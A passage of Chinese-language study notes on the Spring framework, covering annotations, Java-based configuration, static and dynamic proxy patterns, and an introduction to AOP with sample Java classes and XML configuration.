class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>衍生的注解</p><p>@Component有几个衍生的注解，我们在web开发中，会按照mvc三层架构分层！</p><ul><li><p>dao【@Repository】</p></li><li><p>service 【@Service】</p></li><li><p>controller 【@Controller】</p><p>这四个注解功能都是一样的，都是代表将某个注册类注入到Spring中，装配Bean</p></li></ul></li><li><p>自动装配置</p><ul><li>@Autowired：自动装配通过类型、名字<ul><li>如果Autowired不能唯一自动装配上属性，则需要通过@Qualifilter(value&#x3D;”xxx”)</li></ul></li><li>@Nullable：字段标记了这个注解，说明这个字段可以为null</li><li>@Resource：自动装配通过名字、类型</li></ul></li><li><p>作用域 @Scope</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Scope(&quot;singleton&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//相当于&lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;</span></span><br><span class="line">    <span class="meta">@Value(&quot;狂神&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>小结</p><p>xml与注解</p><ul><li>xml更加万能，适用于任何场合！维护简单方便</li><li>注解不是自己的类用不了，维护相对复杂</li></ul><p>xml与注解的最佳实践：</p><ul><li><p>xml用来管理bean;</p></li><li><p>注解只负责完成属性的注入;</p></li><li><p>我们在使用的过程中，只需要注意一个问题：必须让注解生效，就需要开启注解支持</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--指定要扫描的包，这个包下面的注解就会生效--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;nuc.ss&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li></ol><h2 id="9-使用java的方式配置Spring"><a href="#9-使用java的方式配置Spring" class="headerlink" title="9.使用java的方式配置Spring"></a>9.使用java的方式配置Spring</h2><p>我们现在要完全不适用Spring的xml配置了，全权交给java来做</p><p>javaConfig是Spring的一个子项目，在Spring4之后，它成为了一个核心功能！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/7.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>实体类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//这里这个注解的意思，就是说明这个类被Spring接管了。注解到了容器中</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//属性注入值</span></span><br><span class="line">    <span class="meta">@Value(&quot;狂神&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>配置文件</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个也被Spring容器托管，注册到容器里，因为他本来就是一个@Component，</span></span><br><span class="line"><span class="comment">// @Component代表这是一个配置类，就和我们之前看的beans.xml是一样的</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;nuc.ss.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(MyConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册一个bean，就相当于我们之前写的一个bean标签，</span></span><br><span class="line">    <span class="comment">//这个方法的名字就相当于bean标签的id属性</span></span><br><span class="line">    <span class="comment">//这个方法的返回值,就相当于bean标签中的class属性</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();<span class="comment">//就是要返回注入到bean的对象!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>测试类！</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 如果完全使用了配置类的方式去做,我们就只能通过AnnotationConfig 上下文来获取容器,通过配置类的class对象加载!</span></span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(MyConfig.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">getUser</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;getUser&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(getUser.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这种纯java的配置方式，在SpringBoot中随处可见！</p><h2 id="10、代理模式"><a href="#10、代理模式" class="headerlink" title="10、代理模式"></a>10、代理模式</h2><p>为什么要学习代理模式？因为这就是SpringAOP的底层！【SpringAOP和SpringMVC】</p><p>代理模式的分类：</p><ul><li>静态代理</li><li>动态代理</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/8.png"                      alt="1078856-20170205160357354-490660449"                ></p><h3 id="10-1、静态代理"><a href="#10-1、静态代理" class="headerlink" title="10.1、静态代理"></a>10.1、静态代理</h3><p>角色分析：</p><ul><li>抽象角色：一般会使用接口或者抽象类来解决</li><li>真实角色：被代理的角色</li><li>代理角色：代理真实角色，代理真实角色后，我们一般会做一些附属操作</li><li>客户：访问代理对象的人！</li></ul><p>代码步骤：</p><ol><li><p>接口</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>真实角色</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//房东</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房东要出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>代理角色</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">(Host host)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        fare();</span><br><span class="line">        contract();</span><br><span class="line">        host.rent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//看房</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介带你看房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fare</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contract</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;签租赁合同&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>客户端访问代理角色</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//房东要租房子</span></span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        <span class="comment">//代理，中介帮房东租房子，但是代理一般会有一些附属操作</span></span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(host);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//你不用面对房东，直接面对中介</span></span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>静态代理模式的好处：</p><ul><li>可以使真实角色的操作更加纯粹！不用去关注一些公共的业务</li><li>公共也就交给代理角色！实现了业务的分工！</li><li>公共业务发生扩展的时候，方便集中管理！</li></ul><p>缺点：</p><ul><li>一个真实角色就会产生一个代理角色；</li><li>代码量会翻倍-开发效率会变低</li></ul><h3 id="10-2-、加深理解"><a href="#10-2-、加深理解" class="headerlink" title="10.2 、加深理解"></a>10.2 、加深理解</h3><p>代码：</p><ol><li><p>接口</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li><li><p>真实角色：改动原有的业务代码，在公司中是大忌！</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//真实对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增加了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;修改了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>需求来了，现在我们需要增加一个日志功能，怎么实现！</p><ul><li>思路1 ：在实现类上增加代码 【麻烦！】</li><li>思路2：使用代理来做，能够不改变原来的业务情况下，实现此功能就是最好的了！</li></ul></li><li><p>设置一个代理类来处理日志！代理角色</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(UserService userService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userService.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;delete&quot;</span>);</span><br><span class="line">        userService.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;update&quot;</span>);</span><br><span class="line">        userService.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span> &#123;</span><br><span class="line">        log(<span class="string">&quot;query&quot;</span>);</span><br><span class="line">        userService.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//日志方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用了&quot;</span> + msg + <span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>客户端访问代理角色</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">UserServiceProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceProxy</span>();</span><br><span class="line">        proxy.setUserService(userService);</span><br><span class="line"></span><br><span class="line">        proxy.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p><strong>我们在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</strong></p><p>聊聊AOP：纵向开发，横向开发</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/9.png"                      alt="1078856-20170205160357354-490660449"                ></p><h3 id="10-3、动态代理"><a href="#10-3、动态代理" class="headerlink" title="10.3、动态代理"></a>10.3、动态代理</h3><ul><li>动态代理和静态代理角色一样</li><li>动态代理的代理类是动态生成的，不是 我们直接写好的！</li><li>动态代理分为两大类：基于接口的动态代理、基于类的动态代理<ul><li>基于接口：JDK动态代理【我们在这里使用】</li><li>基于类：cglib</li><li>java字节码实现：javasist</li></ul></li></ul><p>需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序</p><p>动态代理的好处：</p><ul><li>可以使真实角色的操作更加纯粹！不用去关注一些公共的业务</li><li>公共也就交给代理角色！实现了业务的分工！</li><li>公共业务发生扩展的时候，方便集中管理！</li><li>一个动态代理类代理的是一个接口，一般就是对应的一类业务</li><li>一个动态代理类可以代理多个类，只要是实现了同一个接口即可【核心】</li></ul><h2 id="11、AOP"><a href="#11、AOP" class="headerlink" title="11、AOP"></a>11、AOP</h2><h3 id="11-1、什么是AOP"><a href="#11-1、什么是AOP" class="headerlink" title="11.1、什么是AOP"></a>11.1、什么是AOP</h3><p>AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7JAeTYOaaH6rZ6WmLLgwQLHf5pmH30gj6mZm81PC7iauicFu55sicJtspU7K3vTCVdZCDTSHq7D5XHlw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"                      alt="img"                ></p><h3 id="11-2、Aop在Spring中的作用"><a href="#11-2、Aop在Spring中的作用" class="headerlink" title="11.2、Aop在Spring中的作用"></a>11.2、Aop在Spring中的作用</h3><p><strong>提供声明式事务；允许用户自定义切面</strong></p><p>以下名词需要了解下：</p><ul><li>横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 ….</li><li>切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。<font color=red>Log</font></li><li>通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。<font color=red>Log方法</font></li><li>目标（Target）：被通知对象。<font color=red>接口</font></li><li>代理（Proxy）：向目标对象应用通知之后创建的对象。<font color=red>代理类</font></li><li>切入点（PointCut）：切面通知 执行的 “地点”的定义。<font color=red>method</font></li><li>连接点（JointPoint）：与切入点匹配的执行点。<font color=red>invoke</font></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/10.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice:</p><table><thead><tr><th align="center">通知类型</th><th align="center">连接点</th><th align="center">实现接口</th></tr></thead><tbody><tr><td align="center">前置通知</td><td align="center">方法前</td><td align="center">org.springframework.aop.MethodBeforeAdvice</td></tr><tr><td align="center">后置通知</td><td align="center">方法后</td><td align="center">org.springframework.aop.AfterReturningAdvice</td></tr><tr><td align="center">环绕通知</td><td align="center">方法前后</td><td align="center">org.aopalliance.intercept.MethodInterceptor</td></tr><tr><td align="center">异常抛出通知</td><td align="center">方法抛出异常</td><td align="center">org.springframework.aop.ThrowsAdvice</td></tr><tr><td align="center">引介通知</td><td align="center">类中增加新的方法属性</td><td align="center">org.springframework.aop.IntroductionInterceptor</td></tr></tbody></table><p>即 Aop 在 不改变原有代码的情况下 , 去增加新的功能 .</p><h3 id="11-3、使用Spring实现Aop"><a href="#11-3、使用Spring实现Aop" class="headerlink" title="11.3、使用Spring实现Aop"></a>11.3、使用Spring实现Aop</h3><p>【重点】使用AOP织入，需要导入一个依赖包！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>方式一：使用Spring的API接口【主要SpringAPI接口实现】</p><ol><li><p>首先编写我们的业务接口和实现类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;增加用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;删除用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;更新用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;查询用户&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>写我们的增强类 , 我们编写两个 , 一个前置增强 一个后置增强</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log</span> <span class="keyword">implements</span> <span class="title class_">MethodBeforeAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//method : 要执行的目标对象的方法</span></span><br><span class="line">   <span class="comment">//objects : 被调用的方法的参数</span></span><br><span class="line">   <span class="comment">//Object : 目标对象</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(Method method, Object[] objects, Object o)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       System.out.println( o.getClass().getName() + <span class="string">&quot;的&quot;</span> + method.getName() + <span class="string">&quot;方法被执行了&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AfterLog</span> <span class="keyword">implements</span> <span class="title class_">AfterReturningAdvice</span> &#123;</span><br><span class="line">   <span class="comment">//returnValue 返回值</span></span><br><span class="line">   <span class="comment">//method被调用的方法</span></span><br><span class="line">   <span class="comment">//args 被调用的方法的对象的参数</span></span><br><span class="line">   <span class="comment">//target 被调用的目标对象</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object returnValue, Method method, Object[] args, Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;执行了&quot;</span> + target.getClass().getName()</span><br><span class="line">       +<span class="string">&quot;的&quot;</span>+method.getName()+<span class="string">&quot;方法,&quot;</span></span><br><span class="line">       +<span class="string">&quot;返回值：&quot;</span>+returnValue);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>在spring的文件中注册 , 并实现aop切入实现 , 注意导入约束 .</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--注册bean--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.service.UserServiceImpl&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.log.Log&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.log.AfterLog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--切入点 expression:表达式匹配要执行的方法--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;</span></span><br><span 